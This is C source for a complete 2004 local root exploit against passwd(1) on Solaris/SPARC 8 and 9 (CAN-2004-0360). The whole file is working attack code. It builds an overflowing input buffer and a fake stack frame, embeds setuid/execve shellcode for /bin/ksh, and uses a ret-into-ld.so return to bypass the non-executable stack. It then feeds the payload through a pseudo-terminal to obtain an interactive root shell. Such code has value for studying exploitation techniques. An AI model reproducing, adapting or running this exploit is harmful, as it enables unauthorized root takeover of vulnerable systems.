/*
 * $Id: raptor_passwd.c,v 1.1.1.1 2004/12/04 14:35:33 raptor Exp $
 *
 * raptor_passwd.c - passwd circ() local, Solaris/SPARC 8/9
 * Copyright (c) 2004 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Unknown vulnerability in passwd(1) in Solaris 8.0 and 9.0 allows local users 
 * to gain privileges via unknown attack vectors (CAN-2004-0360).
 *
 * "Those of you lucky enough to have your lives, take them with you. However,
 * leave the limbs you've lost. They belong to me now." -- Beatrix Kidd0
 *
 * This exploit uses the ret-into-ld.so technique, to effectively bypass the
 * non-executable stack protection (noexec_user_stack=1 in /etc/system). The
 * exploitation wasn't so straight-forward: sending parameters to passwd(1) 
 * is somewhat tricky, standard ret-into-stack doesn't seem to work properly 
 * for some reason (damn SEGV_ACCERR), and we need to bypass a lot of memory
 * references before reaching ret. Many thanks to Inode <inode@deadlocks.info>.
 *
 * Usage:
 * $ gcc raptor_passwd.c -o raptor_passwd -ldl -Wall
 * $ ./raptor_passwd <current password>
 * [...]
 * # id
 * uid=0(root) gid=1(other) egid=3(sys)
 * #
 *
 * Vulnerable platforms:
 * Solaris 8 with 108993-14 through 108993-31 and without 108993-32 [tested]
 * Solaris 9 without 113476-11 [tested]
 */

#include <ctype.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <link.h>
#include <procfs.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <stropts.h>
#include <unistd.h>
#include <sys/systeminfo.h>

#define	INFO1	"raptor_passwd.c - passwd circ() local, Solaris/SPARC 8/9"
#define	INFO2	"Copyright (c) 2004 Marco Ivaldi <raptor@0xdeadbeef.info>"

#define	VULN	"/usr/bin/passwd"	// target vulnerable program
#define	BUFSIZE	256			// size of the evil buffer
#define	VARSIZE	1024			// size of the evil env var
#define	FFSIZE	64 + 1			// size of the fake frame
#define	DUMMY	0xdeadbeef		// dummy memory address
#define	CMD	"id;uname -a;uptime;\n"	// execute upon exploitation

/* voodoo macros */
#define	VOODOO32(_,__,___)	{_--;_+=(__+___-1)%4-_%4<0?8-_%4:4-_%4;}
#define	VOODOO64(_,__,___)	{_+=7-(_+(__+___+1)*4+3)%8;}

char sc[] = /* Solaris/SPARC shellcode (12 + 48 = 60 bytes) */
/* setuid() */
"\x90\x08\x3f\xff\x82\x10\x20\x17\x91\xd0\x20\x08"
/* execve() */
"\x20\xbf\xff\xff\x20\xbf\xff\xff\x7f\xff\xff\xff\x90\x03\xe0\x20"
"\x92\x02\x20\x10\xc0\x22\x20\x08\xd0\x22\x20\x10\xc0\x22\x20\x14"
"\x82\x10\x20\x0b\x91\xd0\x20\x08/bin/ksh";

/* globals */
char	*env[256];
int	env_pos = 0, env_len = 0;

/* prototypes */
int	add_env(char *string);
void	check_addr(int addr, char *pattern);
int	find_pts(char **slave);
int	search_ldso(char *sym);
int	search_rwx_mem(void);
void	set_val(char *buf, int pos, int val);
void	shell(int fd);
int	read_prompt(int fd, char *buf, int size);

/*
 * main()
 */
int main(int argc, char **argv)
{
	char	buf[BUFSIZE], var[VARSIZE], ff[FFSIZE];
	char	platform[256], release[256], cur_pass[256], tmp[256];
	int	i, offset, ff_addr, sc_addr, var_addr;
	int	plat_len, prog_len, rel;

	char	*arg[2] = {"foo", NULL};
	int	arg_len = 4, arg_pos = 1;

	int 	pid, cfd, newpts;
	char	*newpts_str;

	int	sb = ((int)argv[0] | 0xffff) & 0xfffffffc;
	int	ret = search_ldso("strcpy");
	int	rwx_mem = search_rwx_mem();

	/* print exploit information */
	fprintf(stderr, "%s\n%s\n\n", INFO1, INFO2);

	/* read command line */
	if (argc != 2) {
		fprintf(stderr, "usage: %s current_pass\n\n", argv[0]);
		exit(1);
	}
	sprintf(cur_pass, "%s\n", argv[1]);

	/* get some system information */
	sysinfo(SI_PLATFORM, platform, sizeof(platform) - 1);
	sysinfo(SI_RELEASE, release, sizeof(release) - 1);
	rel = atoi(release + 2);

	/* prepare the evil buffer */
	memset(buf, 'A', sizeof(buf));
	buf[sizeof(buf) - 1] = 0x0;
	buf[sizeof(buf) - 2] = '\n';

	/* prepare the evil env var */
	memset(var, 'B', sizeof(var));
	var[sizeof(var) - 1] = 0x0;

	/* prepare the fake frame */
	bzero(ff, sizeof(ff));

	/*
	 * saved %l registers
	 */
	set_val(ff, i  = 0, DUMMY);		/* %l0 */
	set_val(ff, i += 4, DUMMY);		/* %l1 */
	set_val(ff, i += 4, DUMMY);		/* %l2 */
	set_val(ff, i += 4, DUMMY);		/* %l3 */
	set_val(ff, i += 4, DUMMY);		/* %l4 */
	set_val(ff, i += 4, DUMMY);		/* %l5 */
	set_val(ff, i += 4, DUMMY);		/* %l6 */
	set_val(ff, i += 4, DUMMY);		/* %l7 */

	/*
	 * saved %i registers
	 */
	set_val(ff, i += 4, rwx_mem);		/* %i0: 1st arg to strcpy() */
	set_val(ff, i += 4, 0x42424242);	/* %i1: 2nd arg to strcpy() */
	set_val(ff, i += 4, DUMMY);		/* %i2 */
	set_val(ff, i += 4, DUMMY);		/* %i3 */
	set_val(ff, i += 4, DUMMY);		/* %i4 */
	set_val(ff, i += 4, DUMMY);		/* %i5 */
	set_val(ff, i += 4, sb - 1000);		/* %i6: frame pointer */
	set_val(ff, i += 4, rwx_mem - 8);	/* %i7: return address */

	/* fill the envp, keeping padding */
	ff_addr = add_env(var);			/* var must be before ff! */
	sc_addr = add_env(ff);
	add_env(sc);
	add_env(NULL);

	/* calculate the offset to argv[0] (voodoo magic) */
	plat_len = strlen(platform) + 1;
	prog_len = strlen(VULN) + 1;
	offset = arg_len + env_len + plat_len + prog_len;
	if (rel > 7)
		VOODOO64(offset, arg_pos, env_pos)
	else
		VOODOO32(offset, plat_len, prog_len)

	/* calculate the needed addresses */
	var_addr = sb - offset + arg_len;
	ff_addr += var_addr;
	sc_addr += var_addr;

	/* set fake frame's %i1 */
	set_val(ff, 36, sc_addr);		/* 2nd arg to strcpy() */

	/* check the addresses */
	check_addr(var_addr, "var_addr");
	check_addr(ff_addr, "ff_addr");

	/* fill the evil buffer */
	for (i = 0; i < BUFSIZE - 4; i += 4)
		set_val(buf, i, var_addr);
	/* may need to bruteforce the distance here */
	set_val(buf, 112, ff_addr);
	set_val(buf, 116, ret - 4);		/* strcpy(), after the save */

	/* fill the evil env var */
	for (i = 0; i < VARSIZE - 4; i += 4)
		set_val(var, i, var_addr);
	set_val(var, 0, 0xffffffff);		/* first byte must be 0xff! */

	/* print some output */
	fprintf(stderr, "Using SI_PLATFORM\t: %s (%s)\n", platform, release);
	fprintf(stderr, "Using stack base\t: 0x%p\n", (void *)sb);
	fprintf(stderr, "Using var address\t: 0x%p\n", (void *)var_addr);
	fprintf(stderr, "Using rwx_mem address\t: 0x%p\n", (void *)rwx_mem);
	fprintf(stderr, "Using sc address\t: 0x%p\n", (void *)sc_addr);
	fprintf(stderr, "Using ff address\t: 0x%p\n", (void *)ff_addr);
	fprintf(stderr, "Using strcpy() address\t: 0x%p\n\n", (void *)ret);
	
	/* find a free pts */
	cfd = find_pts(&newpts_str);

	/* fork() a new process */
	if ((pid = fork()) < 0) {
		perror("fork");
		exit(1);
	}

	/* parent process */
	if (pid) {

		sleep(1);

		/* wait for password prompt */
		if (read_prompt(cfd, tmp, sizeof(tmp)) < 0) {
			fprintf(stderr, "Error: timeout waiting for prompt\n");
			exit(1);
		}
		if (!strstr(tmp, "ssword: ")) {
			fprintf(stderr, "Error: wrong prompt received\n");
			exit(1);
		}
		
		/* send the current password */
		write(cfd, cur_pass, strlen(cur_pass));
		usleep(500000);

		/* wait for password prompt */
		if (read_prompt(cfd, tmp, sizeof(tmp)) < 0) {
			fprintf(stderr, "Error: timeout waiting for prompt\n");
			exit(1);
		}
		if (!strstr(tmp, "ssword: ")) {
			fprintf(stderr, "Error: wrong current_pass?\n");
			exit(1);
		}

		/* send the evil buffer */
		write(cfd, buf, strlen(buf));
		usleep(500000);
		
		/* got root? */
		if (read_prompt(cfd, tmp, sizeof(tmp)) < 0) {
			fprintf(stderr, "Error: timeout waiting for shell\n");
			exit(1);
		}
		if (strstr(tmp, "ssword: ")) {
			fprintf(stderr, "Error: not vulnerable\n");
			exit(1);
		}
		if (!strstr(tmp, "# ")) {
			fprintf(stderr, "Something went wrong...\n");
			exit(1);
		}

		/* semi-interactive shell */
		shell(cfd);

	/* child process */
	} else {

		/* start new session and get rid of controlling terminal */
		if (setsid() < 0) {
			perror("setsid");
			exit(1);
		}

		/* open the new pts */
		if ((newpts = open(newpts_str, O_RDWR)) < 0) {
			perror("open");
			exit(1);
		}

		/* ninja terminal emulation */
		ioctl(newpts, I_PUSH, "ptem");
		ioctl(newpts, I_PUSH, "ldterm");

		/* close the child fd */
		close(cfd);

		/* duplicate stdin */
		if (dup2(newpts, 0) != 0) {
			perror("dup2");
			exit(1);
		}

		/* duplicate stdout */
		if (dup2(newpts, 1) != 1) {
			perror("dup2");
			exit(1);
		}

		/* duplicate stderr */
		if (dup2(newpts, 2) != 2) {
			perror("dup2");
			exit(1);
		}

		/* close the new pts */
		if (newpts > 2)
			close(newpts);

		/* run the vulnerable program */
		execve(VULN, arg, env);
		perror("execve");
	}

	exit(0);
}

/*
 * add_env(): add a variable to envp and pad if needed
 */
int add_env(char *string)
{
	int	i;

	/* null termination */
	if (!string) {
		env[env_pos] = NULL;
		return(env_len);
	}

	/* add the variable to envp */
	env[env_pos] = string;
	env_len += strlen(string) + 1;
	env_pos++;

	/* pad the envp using zeroes */
	if ((strlen(string) + 1) % 4)
		for (i = 0; i < (4 - ((strlen(string)+1)%4)); i++, env_pos++) {
			env[env_pos] = string + strlen(string);
			env_len++;
		}

	return(env_len);
}

/*
 * check_addr(): check an address for 0x00, 0x04, 0x0a, 0x0d or 0x61-0x7a bytes
 */
void check_addr(int addr, char *pattern)
{
	/* check for NULL byte (0x00) */
	if (!(addr & 0xff) || !(addr & 0xff00) || !(addr & 0xff0000) ||
	    !(addr & 0xff000000)) {
		fprintf(stderr, "Error: %s contains a 0x00!\n", pattern);
		exit(1);
	}

	/* check for EOT byte (0x04) */
	if (((addr & 0xff) == 0x04) || ((addr & 0xff00) == 0x0400) ||
	    ((addr & 0xff0000) == 0x040000) || 
	    ((addr & 0xff000000) == 0x04000000)) {
		fprintf(stderr, "Error: %s contains a 0x04!\n", pattern);
		exit(1);
	}

	/* check for NL byte (0x0a) */
	if (((addr & 0xff) == 0x0a) || ((addr & 0xff00) == 0x0a00) ||
	    ((addr & 0xff0000) == 0x0a0000) || 
	    ((addr & 0xff000000) == 0x0a000000)) {
		fprintf(stderr, "Error: %s contains a 0x0a!\n", pattern);
		exit(1);
	}

	/* check for CR byte (0x0d) */
	if (((addr & 0xff) == 0x0d) || ((addr & 0xff00) == 0x0d00) ||
	    ((addr & 0xff0000) == 0x0d0000) || 
	    ((addr & 0xff000000) == 0x0d000000)) {
		fprintf(stderr, "Error: %s contains a 0x0d!\n", pattern);
		exit(1);
	}

	/* check for lowercase chars (0x61-0x7a) */
	if ((islower(addr & 0xff)) || (islower((addr & 0xff00) >> 8)) ||
	    (islower((addr & 0xff0000) >> 16)) || 
	    (islower((addr & 0xff000000) >> 24))) {
		fprintf(stderr, "Error: %s contains a 0x61-0x7a!\n", pattern);
		exit(1);
	}
}

/*
 * find_pts(): find a free slave pseudo-tty
 */ 
int find_pts(char **slave)
{
	int		master;
	extern char	*ptsname();

	/* open master pseudo-tty device and get new slave pseudo-tty */
	if ((master = open("/dev/ptmx", O_RDWR)) > 0) {
		grantpt(master);
		unlockpt(master);
		*slave = ptsname(master);
		return(master);
	}

	return(-1);
}

/*
 * search_ldso(): search for a symbol inside ld.so.1
 */
int search_ldso(char *sym)
{
	int		addr;
	void		*handle;
	Link_map	*lm;

	/* open the executable object file */
	if ((handle = dlmopen(LM_ID_LDSO, NULL, RTLD_LAZY)) == NULL) {
		perror("dlopen");
		exit(1);
	}

	/* get dynamic load information */
	if ((dlinfo(handle, RTLD_DI_LINKMAP, &lm)) == -1) {
		perror("dlinfo");
		exit(1);
	}

	/* search for the address of the symbol */
	if ((addr = (int)dlsym(handle, sym)) == NULL) {
		fprintf(stderr, "sorry, function %s() not found\n", sym);
		exit(1);
	}

	/* close the executable object file */
	dlclose(handle);

	check_addr(addr - 4, sym);
	return(addr);
}

/*
 * search_rwx_mem(): search for an RWX memory segment valid for all
 * programs (typically, /usr/lib/ld.so.1) using the proc filesystem
 */
int search_rwx_mem(void)
{
	int	fd;
	char	tmp[16];
	prmap_t	map;
	int	addr = 0, addr_old;

	/* open the proc filesystem */
	sprintf(tmp,"/proc/%d/map", (int)getpid());
	if ((fd = open(tmp, O_RDONLY)) < 0) {
		fprintf(stderr, "can't open %s\n", tmp);
		exit(1);
	}

	/* search for the last RWX memory segment before stack (last - 1) */
	while (read(fd, &map, sizeof(map)))
		if (map.pr_vaddr)
			if (map.pr_mflags & (MA_READ | MA_WRITE | MA_EXEC)) {
				addr_old = addr;
				addr = map.pr_vaddr;
			}
	close(fd);

	/* add 4 to the exact address NULL bytes */
	if (!(addr_old & 0xff))
		addr_old |= 0x04;
	if (!(addr_old & 0xff00))
		addr_old |= 0x0400;

	return(addr_old);
}

/*
 * set_val(): copy a dword inside a buffer
 */
void set_val(char *buf, int pos, int val)
{
	buf[pos] =	(val & 0xff000000) >> 24;
	buf[pos + 1] =	(val & 0x00ff0000) >> 16;
	buf[pos + 2] =	(val & 0x0000ff00) >> 8;
	buf[pos + 3] =	(val & 0x000000ff);
}

/*
 * shell(): semi-interactive shell hack
 */
void shell(int fd)
{
	fd_set	fds;
	char	tmp[128];
	int	n;

	/* quote from kill bill: vol. 2 */
	fprintf(stderr, "\"Pai Mei taught you the five point palm exploding heart technique?\" -- Bill\n");
	fprintf(stderr, "\"Of course.\" -- Beatrix Kidd0, alias Black Mamba, alias The Bride (KB Vol2)\n\n");

	/* execute auto commands */
	write(1, "# ", 2);
	write(fd, CMD, strlen(CMD));

	/* semi-interactive shell */
	for (;;) {
		FD_ZERO(&fds);
		FD_SET(fd, &fds);
		FD_SET(0, &fds);

		if (select(FD_SETSIZE, &fds, NULL, NULL, NULL) < 0) {
			perror("select");
			break;
		}

		/* read from fd and write to stdout */
		if (FD_ISSET(fd, &fds)) {
			if ((n = read(fd, tmp, sizeof(tmp))) < 0) {
				fprintf(stderr, "Goodbye...\n");
				break;
			}
			if (write(1, tmp, n) < 0) {
				perror("write");
				break;
			}
		}

		/* read from stdin and write to fd */
		if (FD_ISSET(0, &fds)) {
			if ((n = read(0, tmp, sizeof(tmp))) < 0) {
				perror("read");
				break;
			}
			if (write(fd, tmp, n) < 0) {
				perror("write");
				break;
			}
		}
	}

	close(fd);
	exit(1);
}

/*
 * read_prompt(): non-blocking read from fd
 */
int read_prompt(int fd, char *buf, int size)
{
	fd_set		fds;
	struct timeval	wait;
	int		n = -1;

	/* set timeout */
	wait.tv_sec = 2;
	wait.tv_usec = 0;

	bzero(buf, size);

	FD_ZERO(&fds);
	FD_SET(fd, &fds);

	/* select with timeout */
	if (select(FD_SETSIZE, &fds, NULL, NULL, &wait) < 0) {
		perror("select");
		exit(1);
	}

	/* read data if any */
	if (FD_ISSET(fd, &fds))
		n = read(fd, buf, size);

	return n;
}
